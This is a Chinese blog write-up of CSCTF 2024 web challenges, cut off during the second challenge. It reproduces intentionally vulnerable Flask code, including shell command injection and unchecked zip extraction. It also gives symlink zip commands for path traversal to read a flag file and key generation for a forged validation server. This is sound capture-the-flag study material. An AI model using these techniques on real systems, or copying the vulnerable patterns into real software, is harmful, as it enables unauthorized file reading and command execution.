@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="开始打这种难度高的CTF了，这辈子有了 Web ZipZone Feature Unlocked Trendz Trendzzz Trendzz Web ZipZone 下载附件开工 app.py import logging import os import subprocess import u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSCTF 2024 EICS1 web 部分 wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="开始打这种难度高的CTF了，这辈子有了 Web ZipZone Feature Unlocked Trendz Trendzzz Trendzz Web ZipZone 下载附件开工 app.py import logging import os import subprocess import u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18396244/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18396244/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18396244/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18396244/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18396244/05.png">
+<meta property="article:published_time" content="2024-09-04T05:46:00.000Z">
+<meta property="article:modified_time" content="2024-09-04T05:46:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Crypto">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18396244/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>CSCTF 2024 EICS1 web 部分 wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-09-24-patriot-ctf-2024-misc-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-08-01-deadsecctf-2024-cry-flagkiller-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&text=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&is_video=false&description=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSCTF 2024 EICS1 web 部分 wp&body=Check out this article: https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&title=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&name=CSCTF 2024 EICS1 web 部分 wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-09-04-csctf-2024-eics1-web-wp/&t=CSCTF 2024 EICS1 web 部分 wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ZipZone"><span class="toc-number">1.1.</span> <span class="toc-text">ZipZone</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Feature-Unlocked"><span class="toc-number">1.2.</span> <span class="toc-text">Feature Unlocked</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trendz"><span class="toc-number">1.3.</span> <span class="toc-text">Trendz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trendzzz"><span class="toc-number">1.4.</span> <span class="toc-text">Trendzzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trendzz"><span class="toc-number">1.5.</span> <span class="toc-text">Trendzz</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CSCTF 2024 EICS1 web 部分 wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-04T05:46:00.000Z" class="dt-published" itemprop="datePublished">2024-09-04</time>
+        
+        (Updated: <time datetime="2024-09-04T05:46:00.000Z" class="dt-updated" itemprop="dateModified">2024-09-04</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Crypto/" rel="tag">Crypto</a>, <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/images/migrated/18396244/01.png"></p>
+<p>开始打这种难度高的CTF了，这辈子有了</p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1">Web</a></strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.1">ZipZone</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.2">Feature Unlocked</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.3">Trendz</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.4">Trendzzz</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU#1.5">Trendzz</a></li>
+</ul>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ZipZone"><a href="#ZipZone" class="headerlink" title="ZipZone"></a>ZipZone</h2><p>下载附件开工</p>
+<p>app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import uuid</span><br><span class="line"></span><br><span class="line">from flask import (</span><br><span class="line">    Flask,</span><br><span class="line">    abort,</span><br><span class="line">    flash,</span><br><span class="line">    redirect,</span><br><span class="line">    render_template,</span><br><span class="line">    request,</span><br><span class="line">    send_from_directory,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">upload_dir = &quot;/tmp/&quot;</span><br><span class="line"></span><br><span class="line">app.config[&quot;MAX_CONTENT_LENGTH&quot;] = 1 * 10**6  # 1 MB</span><br><span class="line">app.config[&quot;SECRET_KEY&quot;] = os.urandom(32)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span><br><span class="line">def upload():</span><br><span class="line">    if request.method == &quot;GET&quot;:</span><br><span class="line">        return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">    if &quot;file&quot; not in request.files:</span><br><span class="line">        flash(&quot;No file part!&quot;, &quot;danger&quot;)</span><br><span class="line">        return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">    file = request.files[&quot;file&quot;]</span><br><span class="line">    if file.filename.split(&quot;.&quot;)[-1].lower() != &quot;zip&quot;:</span><br><span class="line">        flash(&quot;Only zip files allowed are allowed!&quot;, &quot;danger&quot;)</span><br><span class="line">        return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">    upload_uuid = str(uuid.uuid4())</span><br><span class="line">    filename = f&quot;&#123;upload_dir&#125;raw/&#123;upload_uuid&#125;.zip&quot;</span><br><span class="line">    file.save(filename)</span><br><span class="line">    subprocess.call([&quot;unzip&quot;, filename, &quot;-d&quot;, f&quot;&#123;upload_dir&#125;files/&#123;upload_uuid&#125;&quot;])</span><br><span class="line">    flash(</span><br><span class="line">        f&#x27;Your file is at &lt;a href=&quot;/files/&#123;upload_uuid&#125;&quot;&gt;&#123;upload_uuid&#125;&lt;/a&gt;!&#x27;, &quot;success&quot;</span><br><span class="line">    )</span><br><span class="line">    logging.info(f&quot;User uploaded file &#123;upload_uuid&#125;.&quot;)</span><br><span class="line">    return redirect(&quot;/&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/files/&lt;path:path&gt;&quot;)</span><br><span class="line">def files(path):</span><br><span class="line">    try:</span><br><span class="line">        return send_from_directory(upload_dir + &quot;files&quot;, path)</span><br><span class="line">    except PermissionError:</span><br><span class="line">        abort(404)</span><br><span class="line"></span><br><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(error):</span><br><span class="line">    return render_template(&quot;404.html&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(debug=True, host=&quot;0.0.0.0&quot;, port=5000)</span><br></pre></td></tr></table></figure>
+
+<p>一个zip上传功能，没几行代码看就完了</p>
+<p>观察到&#x2F;files直接用send_from_dictionary方法发送文件，没有对文件路径进行检查</p>
+<p>看到这里条件反射想到路径穿越。于是寻找sink点</p>
+<p>sink：<br><img src="/images/migrated/18396244/02.png"></p>
+<p>注意到，服务器在解压zip时并没有对内容进行检查。</p>
+<p>一眼丁真：软连接攻击</p>
+<p>但是flag在根目录下没权限，卡这了。后来我队友告诉我在entrypoint.sh里有这样一行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /home/user/flag.txt /tmp/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>我：？？？？？？？？？？？？？？</p>
+<p>这下有权限了。</p>
+<p>linux的软连接类似于windows里的快捷方式。我们新建一个文件并添加软连接读取..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;flag.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../../../../tmp/flag.txt evil.txt</span><br><span class="line"></span><br><span class="line">zip -symlinks evil.txt evil.zip</span><br></pre></td></tr></table></figure>
+
+<p>提交，访问得flag</p>
+<p><strong>CSCTF{5yml1nk5_4r3_w31rd}</strong></p>
+<h2 id="Feature-Unlocked"><a href="#Feature-Unlocked" class="headerlink" title="Feature Unlocked"></a>Feature Unlocked</h2><p>下载附件</p>
+<p>main.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">from flask import Flask, request, render_template, make_response, redirect, url_for</span><br><span class="line">from Crypto.Hash import SHA256</span><br><span class="line">from Crypto.PublicKey import ECC</span><br><span class="line">from Crypto.Signature import DSS</span><br><span class="line">from itsdangerous import URLSafeTimedSerializer</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(16)</span><br><span class="line">serializer = URLSafeTimedSerializer(app.secret_key)</span><br><span class="line"></span><br><span class="line">DEFAULT_VALIDATION_SERVER = &#x27;http://127.0.0.1:1338&#x27;</span><br><span class="line">NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60</span><br><span class="line">DEFAULT_PREFERENCES = base64.b64encode(json.dumps(&#123;</span><br><span class="line">    &#x27;theme&#x27;: &#x27;light&#x27;,</span><br><span class="line">    &#x27;language&#x27;: &#x27;en&#x27;</span><br><span class="line">&#125;).encode()).decode()</span><br><span class="line"></span><br><span class="line">def get_preferences():</span><br><span class="line">    preferences = request.cookies.get(&#x27;preferences&#x27;)</span><br><span class="line">    if not preferences:</span><br><span class="line">        response = make_response(render_template(</span><br><span class="line">            &#x27;index.html&#x27;, new_feature=False))</span><br><span class="line">        response.set_cookie(&#x27;preferences&#x27;, DEFAULT_PREFERENCES)</span><br><span class="line">        return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response</span><br><span class="line">    return json.loads(base64.b64decode(preferences)), None</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    _, response = get_preferences()</span><br><span class="line">    return response if response else render_template(&#x27;index.html&#x27;, new_feature=False)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/release&#x27;)</span><br><span class="line">def release():</span><br><span class="line">    token = request.cookies.get(&#x27;access_token&#x27;)</span><br><span class="line">    if token:</span><br><span class="line">        try:</span><br><span class="line">            data = serializer.loads(token)</span><br><span class="line">            if data == &#x27;access_granted&#x27;:</span><br><span class="line">                return redirect(url_for(&#x27;feature&#x27;))</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;Token validation error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    validation_server = DEFAULT_VALIDATION_SERVER</span><br><span class="line">    if request.args.get(&#x27;debug&#x27;) == &#x27;true&#x27;:</span><br><span class="line">        preferences, _ = get_preferences()</span><br><span class="line">        validation_server = preferences.get(</span><br><span class="line">            &#x27;validation_server&#x27;, DEFAULT_VALIDATION_SERVER)</span><br><span class="line"></span><br><span class="line">    if validate_server(validation_server):</span><br><span class="line">        response = make_response(render_template(</span><br><span class="line">            &#x27;release.html&#x27;, feature_unlocked=True))</span><br><span class="line">        token = serializer.dumps(&#x27;access_granted&#x27;)</span><br><span class="line">        response.set_cookie(&#x27;access_token&#x27;, token, httponly=True, secure=True)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line">    return render_template(&#x27;release.html&#x27;, feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/feature&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def feature():</span><br><span class="line">    token = request.cookies.get(&#x27;access_token&#x27;)</span><br><span class="line">    if not token:</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        data = serializer.loads(token)</span><br><span class="line">        if data != &#x27;access_granted&#x27;:</span><br><span class="line">            return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"></span><br><span class="line">        if request.method == &#x27;POST&#x27;:</span><br><span class="line">            to_process = request.form.get(&#x27;text&#x27;)</span><br><span class="line">            try:</span><br><span class="line">                word_count = f&quot;echo &#123;to_process&#125; | wc -w&quot;</span><br><span class="line">                output = subprocess.check_output(</span><br><span class="line">                    word_count, shell=True, text=True)</span><br><span class="line">            except subprocess.CalledProcessError as e:</span><br><span class="line">                output = f&quot;Error: &#123;e&#125;&quot;</span><br><span class="line">            return render_template(&#x27;feature.html&#x27;, output=output)</span><br><span class="line"></span><br><span class="line">        return render_template(&#x27;feature.html&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line">        return redirect(url_for(&#x27;index&#x27;))</span><br><span class="line"></span><br><span class="line">def get_pubkey(validation_server):</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(f&quot;&#123;validation_server&#125;/pubkey&quot;)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        return ECC.import_key(response.text)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        raise Exception(</span><br><span class="line">            f&quot;Error connecting to validation server for public key: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def validate_access(validation_server):</span><br><span class="line">    pubkey = get_pubkey(validation_server)</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(validation_server)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        data = response.json()</span><br><span class="line">        date = data[&#x27;date&#x27;].encode(&#x27;utf-8&#x27;)</span><br><span class="line">        signature = bytes.fromhex(data[&#x27;signature&#x27;])</span><br><span class="line">        verifier = DSS.new(pubkey, &#x27;fips-186-3&#x27;)</span><br><span class="line">        verifier.verify(SHA256.new(date), signature)</span><br><span class="line">        return int(date)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        raise Exception(f&quot;Error validating access: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def validate_server(validation_server):</span><br><span class="line">    try:</span><br><span class="line">        date = validate_access(validation_server)</span><br><span class="line">        return date &gt;= NEW_FEATURE_RELEASE</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=1337)</span><br></pre></td></tr></table></figure>
+
+<p>validation_server.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, jsonify</span><br><span class="line">import time</span><br><span class="line">from Crypto.Hash import SHA256</span><br><span class="line">from Crypto.PublicKey import ECC</span><br><span class="line">from Crypto.Signature import DSS</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">key = ECC.generate(curve=&#x27;p256&#x27;)</span><br><span class="line">pubkey = key.public_key().export_key(format=&#x27;PEM&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pubkey&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def get_pubkey():</span><br><span class="line">    return pubkey, 200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain; charset=utf-8&#x27;&#125;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    date = str(int(time.time()))</span><br><span class="line">    h = SHA256.new(date.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    signature = DSS.new(key, &#x27;fips-186-3&#x27;).sign(h)</span><br><span class="line"></span><br><span class="line">    return jsonify(&#123;</span><br><span class="line">        &#x27;date&#x27;: date,</span><br><span class="line">        &#x27;signature&#x27;: signature.hex()</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;127.0.0.1&#x27;, port=1338)</span><br></pre></td></tr></table></figure>
+
+<p>审计完之后大致有个思路了：先绕过签名校验得到访问features的权限，再用features打RCE</p>
+<p>套题蒸鹅心</p>
+<p>验证权限的地方跟wanictf的one_day_one_letter神似。问题在于wanictf中的挑战可以直接在请求包中伪造验证服务器。顺着这个思路，我们也许也要通过某些方法伪造验证服务器。</p>
+<p>sink:<br><img src="/images/migrated/18396244/03.png"></p>
+<p>这两行代码在这里纯纯意义不明（bushi）python里的get在字典中没有参数的时候返回值为默认值，即DEFAULT_VALIDATION_SERVER</p>
+<p>而cookie中preferences字典里不可能有validation_server这个参数，也就是说这个参数每一次都是默认值</p>
+<p>burp抓包看preference为eyJ0aGVtZSI6ICJsaWdodCIsICJsYW5ndWFnZSI6ICJlbiJ9，base64解码后得到{“theme”: “light”, “language”: “en”}</p>
+<p>为了绕过签名校验我们生成对公钥和私钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import ECC</span><br><span class="line"></span><br><span class="line">key = ECC.generate(curve=&#x27;P-256&#x27;)</span><br><span class="line"></span><br><span class="line">with open(&#x27;pubkey&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">    f.write(key.public_key().export_key(format=&#x27;PEM&#x27;))</span><br><span class="line"></span><br><span class="line">with open(&#x27;privkey&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">    f.write(key.export_key(format=&#x27;PEM&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>随后服务器上起个伪造的验证服务，将时间提前10000</p>
